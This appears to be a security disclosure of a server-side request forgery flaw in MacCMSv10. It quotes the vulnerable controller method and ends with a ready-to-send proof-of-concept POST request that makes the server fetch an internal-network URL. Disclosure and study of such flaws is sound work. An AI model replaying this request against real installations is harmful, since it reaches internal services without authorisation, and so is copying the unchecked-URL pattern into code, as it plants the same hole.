# Vendor

magicblack

# Product

MacCMSv10

# version

v2025.1000.4050

# Download 

https://github.com/magicblack/maccms10

https://www.maccms.cn/down.html

# Vulnerability

SSRF

# Description

The root cause is that the back-end code receives a user-controllable URL parameter and, without performing strict security validation, directly uses this URL to initiate a network request on behalf of the server itself.

# Analysis

1. The Attacker Provides a Malicious URL
The attacker sends a POST request to the server, with the request body containing a key parameter,
```cjurl:
cjurl=http://192.168.1.81:9898/666.php?id=123&cjflag=&ac=list
```

This URL is an internal network address (192.168.1.81) pointing to a port (9898) that is typically accessible only by the server itself and is not exposed externally. This is a classic characteristic of an SSRF attack.

2. The Controller Receives and Forwards the URL
This request is routed to .../admin/collect/test.html, which executes the test() method within the app/admin/controller/Collect.php file you provided:

```
public function test()
{
    $param = input(); // 1. The $param array here contains the malicious cjurl submitted by the user.
    $res = model('Collect')->vod($param); // 2. The cjurl is passed directly to the model layer without any security checks.
    return json($res);
}
```
As you can see, the test() method acts as the entry point, completely trusts the user's input, and passes the entire $param array, including the malicious cjurl, to the model('Collect')->vod() method.


Vulnerability Verification:

<img width="1538" height="733" alt="image" src="https://github.com/user-attachments/assets/2dabaa08-fd4a-4c9c-85e4-4c518e933f0b" />

Pass the packet test directly:
<img width="1266" height="399" alt="image" src="https://github.com/user-attachments/assets/c739a191-b371-47c5-ad3a-c71ba4b1891d" />


# POC
```
POST /admin1.php/admin/collect/test.html HTTP/1.1
Host: 192.168.1.81:8082
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: PHPSESSID=ao6klcug60d8l6ju5jb1irt6e6
Connection: keep-alive
Content-Length: 61

cjurl=http://192.168.1.81:9898/666.php?id=123&cjflag=&ac=list

```

